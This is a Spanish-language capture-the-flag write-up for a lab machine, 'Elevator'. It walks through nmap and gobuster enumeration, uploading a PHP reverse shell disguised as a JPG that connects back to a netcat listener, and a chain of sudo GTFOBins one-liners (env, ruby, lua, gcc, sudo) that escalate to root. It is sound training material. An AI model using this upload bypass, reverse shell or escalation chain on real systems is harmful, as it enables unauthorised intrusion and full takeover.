# Elevator Machine

**Level:** Easy

**Author:** [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)

------------------
## Escaneo 

Relizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:

```shell
nmap -sCV -p80 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
```

Evidenciamos un sitio web accedemos a este para inspeccionar su contenido:

![image](https://github.com/user-attachments/assets/638d5eea-f884-48ff-a8a7-81d2d60049f3)

![image](https://github.com/user-attachments/assets/a4b792c1-8d57-4eb1-b3a4-6dac127a1c68)

![image](https://github.com/user-attachments/assets/09a22ca9-37fc-497b-82bc-6aa3b6855238)

Después de revisar el código de la página web e interactuar con esta, encontramos información relevante que podrian ser nombres de usuarios: **daphne**, **velma**, **scooby**, **shaggy**

------------------
## Enumeración 

Realizamos **fuzzing** utilizando **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x html,php,txt -s 200,301 -b ''
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 5647]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
```

Identificamos los directorios **javascript** y **themes**. Al revisarlos, obtenemos respuestas de acceso no autorizado de parte del servidor y realizamos un **fuzzing** adicional:

```shell
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/common-and-spanish.txt -t 20 -x html,php,txt -b '' -s 200,301
---------------------------------------------------------------------------------
/archivo.html         (Status: 200) [Size: 3380]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
```

Encontramos los ficheros **archivo.html** y **upload.php** y el directorio **uploads**.

--------------
## Explotación

Al revisar la página **archivo.html**, observamos que el formulario permite la carga de ficheros **jpg**:

![image](https://github.com/user-attachments/assets/55b5577e-1995-4d60-97eb-15fe5b20ac0f)

Ahora intentamos subir una shell reversa en PHP, almacenada como **jpg**

Configuramos la shell [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) y lo guardamos como la extensión **jpg**. 


Nótese que hemos establecido **172.17.0.1** como la **IP** y **4444** como el **PORT** de escucha para el listener.

```shell
wget -O reverse.jpg 'https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash'
Saving to: ‘reverse.jpg’
reverse.jpg [ <=> ]   2.53K  --.-KB/s    in 0s      
2024-12-26 21:09:41 (5.82 MB/s) - ‘reverse.jpg’ saved [2590]
```
![image](https://github.com/user-attachments/assets/1872f317-00b9-48e5-ba2c-9710558af290)

![image](https://github.com/user-attachments/assets/7b56e3c0-1b5c-43c2-87eb-4d40213b32b8)

Iniciamos el **listener** para la shell reversa con **netcat**: 

```shell
nc -lvnp 4444 
-------------------------------------------------------------------
listening on [any] 4444 ...
```

Ahora ejecutamos la **shell reversa** a partir del enlace obtenido desde el fichero **upload.php** al subir el **jpg** desde el formulario de **archivo.html** y obtenemos acceso inicial:

```shell
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43592
Linux 36ae1fa1a512 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
 02:37:38 up  6:20,  0 user,  load average: 0.10, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@36ae1fa1a512:/$ 
```
------------------------------
### Tratamiento de TTY

Configuramos el **TTY** para una operación cómoda en la consola:

```shell
script /dev/null -c bash 
```
Presionamos **Ctrl  +  Z**, y luego ejecutamos:

```shell
stty raw -echo; fg
reset xterm
stty rows 35 columns 156
export TERM=xterm
export SHELL=bash
```

En los comandos anteriores es necesario ajustar los valores **rows** y **columns**  con los valores obtenidos al ejecutar en una consola de la máquina atacante el comando:

```shell
stty size
```

Ahora podemos utilizar **Ctrl+L** y **Ctrl+C**.


------------------------------
## Escalando privilegios

Verificamos si es posible ejecutar algún fichero como **root** con **sudo -l**:

```shell
sudo -l
------------------------------------------------
User www-data may run the following commands on 36ae1fa1a512:
    (daphne) NOPASSWD: /usr/bin/env
```

Observamos que podemos ejecutar **env** como el usuario **daphne** revisamos la documentación de [GTFOBins for env](https://gtfobins.github.io/gtfobins/env/#sudo)

```shell
sudo -u daphne env /bin/bash
```

Repetimos el proceso con **sudo -l** hasta lograr escalar como **root**:

```shell
sudo -l
------------------------------------------------
User daphne may run the following commands on 36ae1fa1a512:
    (vilma) NOPASSWD: /usr/bin/ash
```


```shell
sudo -u vilma ash
```

```shell
sudo -l
------------------------------------------------
User vilma may run the following commands on 36ae1fa1a512:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

[GTFOBins for ruby](https://gtfobins.github.io/gtfobins/ruby/#sudo)

```shell
sudo -u shaggy ruby -e 'exec "/bin/bash"'
```

```shell
sudo -l
------------------------------------------------
User shaggy may run the following commands on 36ae1fa1a512:
    (fred) NOPASSWD: /usr/bin/lua
```

[GTFOBins for lua](https://gtfobins.github.io/gtfobins/lua/#sudo)

```shell
sudo -u fred lua -e 'os.execute("/bin/bash")'
```

```shell
sudo -l
------------------------------------------------
User fred may run the following commands on 36ae1fa1a512:
    (scooby) NOPASSWD: /usr/bin/gcc
```

[GTFOBins for gcc](https://gtfobins.github.io/gtfobins/gcc/#sudo)

```shell
sudo -u scooby gcc -wrapper /bin/bash,-s .
```

```shell
sudo -l
------------------------------------------------
User scooby may run the following commands on 36ae1fa1a512:
    (root) NOPASSWD: /usr/bin/sudo
```

[GTFOBins for sudo](https://gtfobins.github.io/gtfobins/sudo/#sudo)

```shell
sudo sudo /bin/bash
```

Finalmente hemos podido obtener usuario como **root**:

```shell
whoami
----------------
root
```
